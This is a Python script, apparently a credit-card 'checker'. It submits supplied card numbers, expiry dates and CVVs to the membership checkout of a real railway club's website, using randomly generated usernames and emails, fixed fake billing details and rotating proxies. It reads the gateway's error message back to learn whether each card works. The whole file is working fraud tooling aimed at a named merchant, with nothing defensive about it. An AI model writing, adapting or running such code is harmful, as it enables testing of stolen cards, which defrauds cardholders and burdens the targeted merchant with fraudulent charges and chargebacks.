import requests
import random,string
import asyncio
from proxy import proxies
def getstr(src, start, end):
    try:
        start_index = src.index(start) + len(start)
        end_index = src.index(end, start_index)
        return src[start_index:end_index]
    except ValueError:
        return None
def generate_username(length=(random.randint(6, 10))):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
def generate_email(length=(random.randint(6, 10))):
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com','aol.com', 'icloud.com'])
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + f'@{domain}'
async def usaepay2(cc,mm,yy,cvv):
    if cc.startswith('4'):
        type = 'Visa'
    elif cc.startswith('5'):
        type = 'Mastercard'
    else:
        return 'Card Not Supported'
    email = generate_email()
    username = generate_username()
    r = requests.Session()
    r.proxies = proxies()
    
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            #'cookie': 'PHPSESSID=f289ddda149300ff46f102f747ab9a36; pmpro_visit=1',
            'origin': 'https://www.torontorailwayclub.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://www.torontorailwayclub.com/membership-account/membership-checkout/?level=8',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

    params = {
        'level': '8'
    }


    data = {
            'level': '8',
            'checkjavascript': '1',
            'username': username,
            'bemail': email,
            'bconfirmemail': email,
            'password': 'rgggcdd@gmail.com',
            'password2': 'rgggcdd@gmail.com',
            'fullname': '',
            'bfirstname': 'Albedo',
            'blastname': 'Jones',
            'baddress1': 'New York',
            'baddress2': '',
            'bcity': 'New York',
            'bstate': 'NY',
            'bzipcode': '10080',
            'bcountry': 'US',
            'bphone': '4788854479',
            'CardType': type,
            'AccountNumber': cc,
            'ExpirationMonth': mm,
            'ExpirationYear': yy,
            'CVV': cvv,
            'submit-checkout': '1',
            'javascriptok': '1'
        }
    try:
            response = r.post('https://www.torontorailwayclub.com/membership-account/membership-checkout/', headers=headers, params=params, data=data)
            msg = getstr(response.text, 'pmpro_message pmpro_error">', '</div>')
            if msg:
                    return msg
            else:
                    return 'Order placed successfully!'
    except Exception as e:
             return 'Error: Failed to place order'

